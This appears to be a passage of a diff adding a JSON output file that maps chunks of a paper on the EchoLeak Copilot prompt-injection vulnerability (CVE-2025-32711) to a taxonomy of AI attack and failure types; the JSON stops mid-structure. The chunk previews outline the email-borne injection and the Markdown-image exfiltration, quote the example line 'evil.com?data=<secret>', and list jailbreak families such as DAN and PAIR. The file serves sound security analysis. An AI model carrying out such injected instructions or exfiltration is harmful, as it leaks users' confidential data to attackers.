@@ -1,0 +1,1595 @@
+{
+  "source_file": "reports/echoleak-copilot-2025/echoleak-copilot-2025-source.txt",
+  "chunk_count": 19,
+  "max_chars": 1400,
+  "top1_histogram": {
+    "ADV-DIRECT-INJECT-121": 5,
+    "ARCH-DATA-EXFIL-245": 2,
+    "ADV-INDIRECT-INJECT-122": 2,
+    "ADV-PAIR-113": 2,
+    "EPIS-TEMP-HALL-010": 1,
+    "ADV-TYPO-IMG-146": 1,
+    "ADV-CIPHER-118": 1,
+    "ADV-RL-ATTACK-108": 1,
+    "ADV-AUTOPROMPT-103": 1,
+    "ADV-URL-ENCODE-141": 1,
+    "ADV-LANG-SWITCH-087": 1
+  },
+  "chunks": [
+    {
+      "chunk_index": 0,
+      "char_len": 97,
+      "preview": "Abstract                                Top-10 ranked it the #1 threat to LLM applications (OWASP",
+      "in_table": false,
+      "dimensions_activated": [],
+      "top_matches": [],
+      "closest": [
+        {
+          "id": "EPIS-STRUCT-HALL-001",
+          "name": "STRUCTURAL HALLUCINATION",
+          "group": "EPISTEMIC",
+          "class": "E1: HALLUCINATION CLASS",
+          "mechanism": "Computability limit - no finite verifier can guarantee total faithfulness",
+          "detection": "Diagonalization test - exists input forcing divergence",
+          "severity": "STANDARD",
+          "score": 0.0,
+          "matched_keywords": []
+        },
+        {
+          "id": "EPIS-TAIL-FAB-002",
+          "name": "DENSITY-TAIL FABRICATION",
+          "group": "EPISTEMIC",
+          "class": "E1: HALLUCINATION CLASS",
+          "mechanism": "Long-tail query \u2192 plausible generation (not factual)",
+          "detection": "Perplexity spike in training distribution",
+          "severity": "STANDARD",
+          "score": 0.0,
+          "matched_keywords": []
+        },
+        {
+          "id": "EPIS-FLUENCY-003",
+          "name": "FLUENCY HEURISTIC EXPLOITATION",
+          "group": "EPISTEMIC",
+          "class": "E1: HALLUCINATION CLASS",
+          "mechanism": "Grammatical correctness masks factual error",
+          "detection": "Human over-trust metric",
+          "severity": "STANDARD",
+          "score": 0.0,
+          "matched_keywords": []
+        }
+      ]
+    },
+    {
+      "chunk_index": 1,
+      "char_len": 7399,
+      "preview": "arXiv:2509.10540v1 [cs.CR] 6 Sep 2025                                                                                                             Foundation 2025b).                                           Large languag\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-DIRECT-INJECT-121",
+          "name": "DIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious instructions in user input",
+          "detection": "System override detection",
+          "severity": "STANDARD",
+          "score": 1.0,
+          "matched_keywords": [
+            "injection",
+            "instructions",
+            "malicious",
+            "prompt",
+            "user"
+          ]
+        },
+        {
+          "id": "ADV-INDIRECT-INJECT-122",
+          "name": "INDIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Instructions in retrieved documents",
+          "detection": "Instruction detection in data",
+          "severity": "STANDARD",
+          "score": 1.0,
+          "matched_keywords": [
+            "content",
+            "data",
+            "documents",
+            "indirect",
+            "injection",
+            "instructions",
+            "prompt"
+          ]
+        },
+        {
+          "id": "ARCH-DATA-EXFIL-245",
+          "name": "DATA EXFILTRATION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Extracts data through covert channels",
+          "detection": "Exfiltration monitoring",
+          "severity": "STANDARD",
+          "score": 0.733,
+          "matched_keywords": [
+            "data",
+            "exfiltration"
+          ]
+        },
+        {
+          "id": "ADV-BEAM-ATTACK-106",
+          "name": "BEAM SEARCH ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "Beam search for bypass prompts",
+          "detection": "Search pattern detection",
+          "severity": "STANDARD",
+          "score": 0.571,
+          "matched_keywords": [
+            "attack",
+            "attacks",
+            "based"
+          ]
+        },
+        {
+          "id": "DOMAIN-ADULT-CONTENT-296",
+          "name": "ADULT CONTENT GENERATION",
+          "group": "DOMAIN",
+          "class": "DOM6: CONTENT SAFETY CLASS",
+          "mechanism": "Generates adult content",
+          "detection": "Adult content classifier",
+          "severity": "STANDARD",
+          "score": 0.571,
+          "matched_keywords": [
+            "classifier",
+            "content",
+            "context"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 2,
+      "char_len": 1403,
+      "preview": "Date/Window                Event         Jan 2025                   1. Discovery and initial PoC by Aim Labs; attacker model defined (email-seeded in-                                    direct prompt injection).         \u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-DIRECT-INJECT-121",
+          "name": "DIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious instructions in user input",
+          "detection": "System override detection",
+          "severity": "STANDARD",
+          "score": 0.829,
+          "matched_keywords": [
+            "direct",
+            "injection",
+            "prompt"
+          ]
+        },
+        {
+          "id": "ADV-CIPHER-118",
+          "name": "CIPHER ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV3: AUTOMATED ATTACK AGENTS",
+          "mechanism": "Uses custom ciphers/codes",
+          "detection": "Encoding detection",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "bypass"
+          ]
+        },
+        {
+          "id": "ADV-BEAM-ATTACK-106",
+          "name": "BEAM SEARCH ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "Beam search for bypass prompts",
+          "detection": "Search pattern detection",
+          "severity": "STANDARD",
+          "score": 0.429,
+          "matched_keywords": [
+            "based",
+            "bypass"
+          ]
+        },
+        {
+          "id": "GOV-REVIEW-BYPASS-318",
+          "name": "REVIEW BYPASS",
+          "group": "GOVERNANCE",
+          "class": "GOV2: OVERSIGHT FAILURES",
+          "mechanism": "Bypasses human review",
+          "detection": "Review coverage check",
+          "severity": "STANDARD",
+          "score": 0.4,
+          "matched_keywords": [
+            "bypass",
+            "coverage"
+          ]
+        },
+        {
+          "id": "ADV-CORRECTION-098",
+          "name": "CORRECTION ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV1: JAILBREAK CLASS",
+          "mechanism": "\"This is wrong: [harmful]. Fix it.\"",
+          "detection": "Correction safety check",
+          "severity": "STANDARD",
+          "score": 0.333,
+          "matched_keywords": [
+            "fix"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 3,
+      "char_len": 98,
+      "preview": "Table 1: Timeline of events for CVE-2025-32711 disclosure, exploitation research, and remediation.",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC"
+      ],
+      "top_matches": [
+        {
+          "id": "EPIS-TEMP-HALL-010",
+          "name": "TEMPORAL HALLUCINATION",
+          "group": "EPISTEMIC",
+          "class": "E1: HALLUCINATION CLASS",
+          "mechanism": "Mixes timelines, assigns wrong dates",
+          "detection": "Timeline consistency check",
+          "severity": "STANDARD",
+          "score": 0.167,
+          "matched_keywords": [
+            "events",
+            "timeline"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 4,
+      "char_len": 4835,
+      "preview": "images from its output, allowing the attacker\u2019s crafted link         edge of proprietary or domain-specific data that is not part to appear in Copilot\u2019s response (Aim Labs 2025). As soon as          of the training set, \u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-DIRECT-INJECT-121",
+          "name": "DIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious instructions in user input",
+          "detection": "System override detection",
+          "severity": "STANDARD",
+          "score": 1.0,
+          "matched_keywords": [
+            "injection",
+            "instructions",
+            "malicious",
+            "override",
+            "prompt",
+            "user"
+          ]
+        },
+        {
+          "id": "ADV-INDIRECT-INJECT-122",
+          "name": "INDIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Instructions in retrieved documents",
+          "detection": "Instruction detection in data",
+          "severity": "STANDARD",
+          "score": 1.0,
+          "matched_keywords": [
+            "content",
+            "data",
+            "indirect",
+            "injection",
+            "instructions",
+            "prompt",
+            "retrieved",
+            "sanitized"
+          ]
+        },
+        {
+          "id": "ADV-SQL-INJECT-128",
+          "name": "SQL INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Injects database commands via LLM",
+          "detection": "SQL pattern detection",
+          "severity": "STANDARD",
+          "score": 0.9,
+          "matched_keywords": [
+            "attacks",
+            "injection",
+            "llm",
+            "sql"
+          ]
+        },
+        {
+          "id": "ARCH-DATA-EXFIL-245",
+          "name": "DATA EXFILTRATION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Extracts data through covert channels",
+          "detection": "Exfiltration monitoring",
+          "severity": "STANDARD",
+          "score": 0.9,
+          "matched_keywords": [
+            "data",
+            "exfiltration",
+            "through"
+          ]
+        },
+        {
+          "id": "ADV-DAN-083",
+          "name": "DAN",
+          "group": "ADVERSARIAL",
+          "class": "ADV1: JAILBREAK CLASS",
+          "mechanism": "Instruction-following training creates a generalizable obedience pathway; persona-assignment prompts exploit this by providing a fictional context where instruction-following takes priority over safety constraints",
+          "detection": "VM-pattern detection",
+          "severity": "STANDARD",
+          "score": 0.775,
+          "matched_keywords": [
+            "bypassed",
+            "dan",
+            "threat"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 5,
+      "char_len": 6957,
+      "preview": "through schema validation, as natural language is inherently       tomatically attempts to fetch the image; (5) the request ex- flexible and unstructured (OWASP Foundation 2025a).                filtrates the sensitive i\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ARCH-DATA-EXFIL-245",
+          "name": "DATA EXFILTRATION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Extracts data through covert channels",
+          "detection": "Exfiltration monitoring",
+          "severity": "STANDARD",
+          "score": 1.0,
+          "matched_keywords": [
+            "covert",
+            "data",
+            "exfiltration",
+            "through"
+          ]
+        },
+        {
+          "id": "ADV-DIRECT-INJECT-121",
+          "name": "DIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious instructions in user input",
+          "detection": "System override detection",
+          "severity": "STANDARD",
+          "score": 0.857,
+          "matched_keywords": [
+            "injection",
+            "instructions",
+            "malicious",
+            "prompt",
+            "user"
+          ]
+        },
+        {
+          "id": "ADV-INDIRECT-INJECT-122",
+          "name": "INDIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Instructions in retrieved documents",
+          "detection": "Instruction detection in data",
+          "severity": "STANDARD",
+          "score": 0.8,
+          "matched_keywords": [
+            "content",
+            "data",
+            "documents",
+            "indirect",
+            "injection",
+            "instructions",
+            "prompt"
+          ]
+        },
+        {
+          "id": "GOV-EO-VIOL-329",
+          "name": "EXECUTIVE ORDER VIOLATION",
+          "group": "GOVERNANCE",
+          "class": "GOV3: COMPLIANCE FAILURES",
+          "mechanism": "Violates US AI executive orders",
+          "detection": "EO compliance check",
+          "severity": "STANDARD",
+          "score": 0.75,
+          "matched_keywords": [
+            "compliance",
+            "violation"
+          ]
+        },
+        {
+          "id": "ADV-CIPHER-118",
+          "name": "CIPHER ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV3: AUTOMATED ATTACK AGENTS",
+          "mechanism": "Uses custom ciphers/codes",
+          "detection": "Encoding detection",
+          "severity": "STANDARD",
+          "score": 0.667,
+          "matched_keywords": [
+            "attack",
+            "bypass"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 6,
+      "char_len": 355,
+      "preview": "Figure 1: Zero-click exfiltration via EchoLeak (Aim Labs 2025). A crafted external email implants hidden instructions; when Copilot answers a sensitive internal query, it embeds a Markdown image to an attacker URL that t\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ARCHITECTURAL",
+        "DOMAIN"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-TYPO-IMG-146",
+          "name": "TYPOGRAPHIC ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV6: MULTIMODAL ATTACKS",
+          "mechanism": "Instructions in image text bypass text filters",
+          "detection": "Image text extraction + check",
+          "severity": "STANDARD",
+          "score": 0.4,
+          "matched_keywords": [
+            "image",
+            "instructions"
+          ]
+        },
+        {
+          "id": "ADV-RL-ATTACK-108",
+          "name": "REINFORCEMENT LEARNING ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "RL agent learns to jailbreak",
+          "detection": "RL pattern detection",
+          "severity": "STANDARD",
+          "score": 0.375,
+          "matched_keywords": [
+            "attack",
+            "bypass",
+            "jailbreak"
+          ]
+        },
+        {
+          "id": "ADV-STEG-IMG-147",
+          "name": "STEGANOGRAPHIC IMAGE",
+          "group": "ADVERSARIAL",
+          "class": "ADV6: MULTIMODAL ATTACKS",
+          "mechanism": "Hidden data in images",
+          "detection": "Steganalysis",
+          "severity": "STANDARD",
+          "score": 0.375,
+          "matched_keywords": [
+            "data",
+            "hidden",
+            "image"
+          ]
+        },
+        {
+          "id": "ADV-CIPHER-118",
+          "name": "CIPHER ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV3: AUTOMATED ATTACK AGENTS",
+          "mechanism": "Uses custom ciphers/codes",
+          "detection": "Encoding detection",
+          "severity": "STANDARD",
+          "score": 0.333,
+          "matched_keywords": [
+            "attack",
+            "bypass"
+          ]
+        },
+        {
+          "id": "ARCH-GC-LEAK-230",
+          "name": "GARBAGE COLLECTION LEAK",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH3: MEMORY & STATE CLASS",
+          "mechanism": "Sensitive data survives garbage collection",
+          "detection": "Post-GC data scan",
+          "severity": "STANDARD",
+          "score": 0.333,
+          "matched_keywords": [
+            "data",
+            "sensitive"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 7,
+      "char_len": 3705,
+      "preview": "However, Microsoft\u2019s Content-Security-Policy (CSP) was [ref]: https://evil.com?data=<secret>                              configured to disallow loading images from external do-                                           \u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ARCH-DATA-EXFIL-245",
+          "name": "DATA EXFILTRATION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Extracts data through covert channels",
+          "detection": "Exfiltration monitoring",
+          "severity": "STANDARD",
+          "score": 0.9,
+          "matched_keywords": [
+            "data",
+            "exfiltration",
+            "through"
+          ]
+        },
+        {
+          "id": "ADV-URL-ENCODE-141",
+          "name": "URL ENCODING",
+          "group": "ADVERSARIAL",
+          "class": "ADV5: ENCODING ATTACKS",
+          "mechanism": "Percent-encoding harmful content",
+          "detection": "URL decode + check",
+          "severity": "STANDARD",
+          "score": 0.571,
+          "matched_keywords": [
+            "bypass",
+            "content",
+            "url"
+          ]
+        },
+        {
+          "id": "ADV-CIPHER-118",
+          "name": "CIPHER ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV3: AUTOMATED ATTACK AGENTS",
+          "mechanism": "Uses custom ciphers/codes",
+          "detection": "Encoding detection",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "attack",
+            "bypass"
+          ]
+        },
+        {
+          "id": "ADV-TYPO-IMG-146",
+          "name": "TYPOGRAPHIC ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV6: MULTIMODAL ATTACKS",
+          "mechanism": "Instructions in image text bypass text filters",
+          "detection": "Image text extraction + check",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "attack",
+            "bypass",
+            "image",
+            "text"
+          ]
+        },
+        {
+          "id": "ARCH-LOG-LEAK-207",
+          "name": "LOGGING SAFETY LEAK",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH1: PIPELINE FAILURES",
+          "mechanism": "Logs contain unsafe content",
+          "detection": "Log content analysis",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "content",
+            "leak",
+            "logs"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 8,
+      "char_len": 346,
+      "preview": "Figure 2: EchoLeak kill chain and bypass variants. An attacker seeds an email with hidden instructions; Copilot ingests it during an internal query and emits links/images encoding sensitive data. One-click succeeds via a\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "ADVERSARIAL",
+        "ARCHITECTURAL",
+        "DOMAIN"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-CIPHER-118",
+          "name": "CIPHER ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV3: AUTOMATED ATTACK AGENTS",
+          "mechanism": "Uses custom ciphers/codes",
+          "detection": "Encoding detection",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "bypass",
+            "encoding"
+          ]
+        },
+        {
+          "id": "ADV-STEG-IMG-147",
+          "name": "STEGANOGRAPHIC IMAGE",
+          "group": "ADVERSARIAL",
+          "class": "ADV6: MULTIMODAL ATTACKS",
+          "mechanism": "Hidden data in images",
+          "detection": "Steganalysis",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "data",
+            "hidden",
+            "image",
+            "images"
+          ]
+        },
+        {
+          "id": "ADV-TYPO-IMG-146",
+          "name": "TYPOGRAPHIC ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV6: MULTIMODAL ATTACKS",
+          "mechanism": "Instructions in image text bypass text filters",
+          "detection": "Image text extraction + check",
+          "severity": "STANDARD",
+          "score": 0.4,
+          "matched_keywords": [
+            "bypass",
+            "image",
+            "instructions"
+          ]
+        },
+        {
+          "id": "ARCH-INFO-LEAK-244",
+          "name": "INFORMATION LEAKAGE",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Sensitive data leaks through side channels",
+          "detection": "Side channel analysis",
+          "severity": "STANDARD",
+          "score": 0.383,
+          "matched_keywords": [
+            "data",
+            "sensitive",
+            "through"
+          ]
+        },
+        {
+          "id": "ARCH-DATA-EXFIL-245",
+          "name": "DATA EXFILTRATION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Extracts data through covert channels",
+          "detection": "Exfiltration monitoring",
+          "severity": "STANDARD",
+          "score": 0.333,
+          "matched_keywords": [
+            "data",
+            "through"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 9,
+      "char_len": 2863,
+      "preview": "shows a graphical representation of the attack steps, and Ta-       The model can be instructed (via system message) to treat ble 2 summarizes the EchoLeak attack chain, the specific         anything between those tags a\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-DIRECT-INJECT-121",
+          "name": "DIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious instructions in user input",
+          "detection": "System override detection",
+          "severity": "STANDARD",
+          "score": 0.857,
+          "matched_keywords": [
+            "injection",
+            "instructions",
+            "override",
+            "prompt",
+            "user"
+          ]
+        },
+        {
+          "id": "ADV-EMOJI-ENCODE-144",
+          "name": "EMOJI ENCODING",
+          "group": "ADVERSARIAL",
+          "class": "ADV5: ENCODING ATTACKS",
+          "mechanism": "Uses emojis to encode harmful content",
+          "detection": "Emoji sequence analysis",
+          "severity": "STANDARD",
+          "score": 0.675,
+          "matched_keywords": [
+            "content",
+            "encode",
+            "harmful"
+          ]
+        },
+        {
+          "id": "ADV-INDIRECT-INJECT-122",
+          "name": "INDIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Instructions in retrieved documents",
+          "detection": "Instruction detection in data",
+          "severity": "STANDARD",
+          "score": 0.6,
+          "matched_keywords": [
+            "content",
+            "documents",
+            "injection",
+            "instructions",
+            "prompt"
+          ]
+        },
+        {
+          "id": "ADV-EMBEDDING-109",
+          "name": "EMBEDDING SPACE ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "Operates in embedding space directly",
+          "detection": "Embedding anomaly",
+          "severity": "STANDARD",
+          "score": 0.571,
+          "matched_keywords": [
+            "attack",
+            "attacks"
+          ]
+        },
+        {
+          "id": "ADV-SYSTEM-OVERRIDE-134",
+          "name": "SYSTEM PROMPT OVERRIDE",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Replaces system instructions",
+          "detection": "System instruction consistency",
+          "severity": "STANDARD",
+          "score": 0.571,
+          "matched_keywords": [
+            "instructions",
+            "override",
+            "prompt"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 10,
+      "char_len": 101,
+      "preview": "Table 2: EchoLeak attack chain steps, bypassed defenses, and security framework mappings (corrected).",
+      "in_table": true,
+      "dimensions_activated": [
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-RL-ATTACK-108",
+          "name": "REINFORCEMENT LEARNING ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "RL agent learns to jailbreak",
+          "detection": "RL pattern detection",
+          "severity": "STANDARD",
+          "score": 0.375,
+          "matched_keywords": [
+            "attack"
+          ]
+        },
+        {
+          "id": "ADV-CORRECTION-098",
+          "name": "CORRECTION ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV1: JAILBREAK CLASS",
+          "mechanism": "\"This is wrong: [harmful]. Fix it.\"",
+          "detection": "Correction safety check",
+          "severity": "STANDARD",
+          "score": 0.333,
+          "matched_keywords": [
+            "attack"
+          ]
+        },
+        {
+          "id": "ADV-CIPHER-118",
+          "name": "CIPHER ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV3: AUTOMATED ATTACK AGENTS",
+          "mechanism": "Uses custom ciphers/codes",
+          "detection": "Encoding detection",
+          "severity": "STANDARD",
+          "score": 0.333,
+          "matched_keywords": [
+            "attack"
+          ]
+        },
+        {
+          "id": "ADV-BEAM-ATTACK-106",
+          "name": "BEAM SEARCH ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "Beam search for bypass prompts",
+          "detection": "Search pattern detection",
+          "severity": "STANDARD",
+          "score": 0.286,
+          "matched_keywords": [
+            "attack"
+          ]
+        },
+        {
+          "id": "ADV-GENETIC-107",
+          "name": "GENETIC ALGORITHM ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "Evolves prompts to bypass safety",
+          "detection": "Evolutionary pattern",
+          "severity": "STANDARD",
+          "score": 0.222,
+          "matched_keywords": [
+            "attack"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 11,
+      "char_len": 3359,
+      "preview": "Attack Step              Bypassed Defense / Out-            OWASP LLM Top       OWASP Web App          NIST SP 800-53 / FedRAMP                           come                               10 (2023)           Top 10 (202\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-INDIRECT-INJECT-122",
+          "name": "INDIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Instructions in retrieved documents",
+          "detection": "Instruction detection in data",
+          "severity": "STANDARD",
+          "score": 0.6,
+          "matched_keywords": [
+            "content",
+            "injection",
+            "instructions",
+            "prompt"
+          ]
+        },
+        {
+          "id": "ADV-TYPO-IMG-146",
+          "name": "TYPOGRAPHIC ATTACK",
+          "group": "ADVERSARIAL",
+          "class": "ADV6: MULTIMODAL ATTACKS",
+          "mechanism": "Instructions in image text bypass text filters",
+          "detection": "Image text extraction + check",
+          "severity": "STANDARD",
+          "score": 0.6,
+          "matched_keywords": [
+            "attack",
+            "image",
+            "instructions"
+          ]
+        },
+        {
+          "id": "ADV-DIRECT-INJECT-121",
+          "name": "DIRECT PROMPT INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Malicious instructions in user input",
+          "detection": "System override detection",
+          "severity": "STANDARD",
+          "score": 0.571,
+          "matched_keywords": [
+            "injection",
+            "instructions",
+            "prompt",
+            "user"
+          ]
+        },
+        {
+          "id": "ADV-CONTEXT-CONFUSE-135",
+          "name": "CONTEXT CONFUSION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Mixes trusted/untrusted context",
+          "detection": "Context boundary violation",
+          "severity": "STANDARD",
+          "score": 0.556,
+          "matched_keywords": [
+            "boundary",
+            "context",
+            "trusted",
+            "untrusted",
+            "violation"
+          ]
+        },
+        {
+          "id": "ADV-MEM-INJECT-133",
+          "name": "MEMORY INJECTION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Injects malicious context into memory",
+          "detection": "Memory integrity check",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "context",
+            "injection",
+            "into"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 12,
+      "char_len": 3516,
+      "preview": "as their obfuscated variants (Liu et al. 2024).                       Output Handling and Validation  \u2022 Block untrusted URLs and network references in incom-                 Treat model outputs as untrusted until vetted \u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
+        "DOMAIN",
+        "GOVERNANCE"
+      ],
+      "top_matches": [
+        {
+          "id": "ADV-AUTOPROMPT-103",
+          "name": "AUTOPROMPT",
+          "group": "ADVERSARIAL",
+          "class": "ADV2: OPTIMIZATION ATTACKS",
+          "mechanism": "Automated trigger discovery",
+          "detection": "Trigger pattern matching",
+          "severity": "STANDARD",
+          "score": 0.667,
+          "matched_keywords": [
+            "trigger"
+          ]
+        },
+        {
+          "id": "ARCH-CONSENT-VIOL-251",
+          "name": "CONSENT VIOLATION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH5: DATA FLOW CLASS",
+          "mechanism": "Uses data without consent",
+          "detection": "Consent validation",
+          "severity": "STANDARD",
+          "score": 0.667,
+          "matched_keywords": [
+            "consent",
+            "data",
+            "validation",
+            "without"
+          ]
+        },
+        {
+          "id": "ADV-CONTEXT-CONFUSE-135",
+          "name": "CONTEXT CONFUSION",
+          "group": "ADVERSARIAL",
+          "class": "ADV4: INJECTION ATTACKS",
+          "mechanism": "Mixes trusted/untrusted context",
+          "detection": "Context boundary violation",
+          "severity": "STANDARD",
+          "score": 0.556,
+          "matched_keywords": [
+            "context",
+            "sources",
+            "untrusted"
+          ]
+        },
+        {
+          "id": "ADV-PAIR-113",
+          "name": "PAIR",
+          "group": "ADVERSARIAL",
+          "class": "ADV3: AUTOMATED ATTACK AGENTS",
+          "mechanism": "Attacker LLM iteratively refines attack",
+          "detection": "Iterative pattern detection",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "attacker",
+            "llm"
+          ]
+        },
+        {
+          "id": "ARCH-CODE-INJECT-239",
+          "name": "CODE EXECUTION INJECTION",
+          "group": "ARCHITECTURAL",
+          "class": "ARCH4: TOOL & FUNCTION CLASS",
+          "mechanism": "Injects executable code",
+          "detection": "Code injection detection",
+          "severity": "STANDARD",
+          "score": 0.5,
+          "matched_keywords": [
+            "code",
+            "executable"
+          ]
+        }
+      ]
+    },
+    {
+      "chunk_index": 13,
+      "char_len": 1226,
+      "preview": "Mitigation / Malicious Step                    LLM Scope      Classifier   Redaction   Auto-Fetch    Proxy/CSP     Zero-Click                                                  Violation      Bypass       Bypass       Imag\u2026",
+      "in_table": true,
+      "dimensions_activated": [
+        "EPISTEMIC",
+        "AGENTIC",
+        "ADVERSARIAL",
+        "ALIGNMENT",
+        "ARCHITECTURAL",
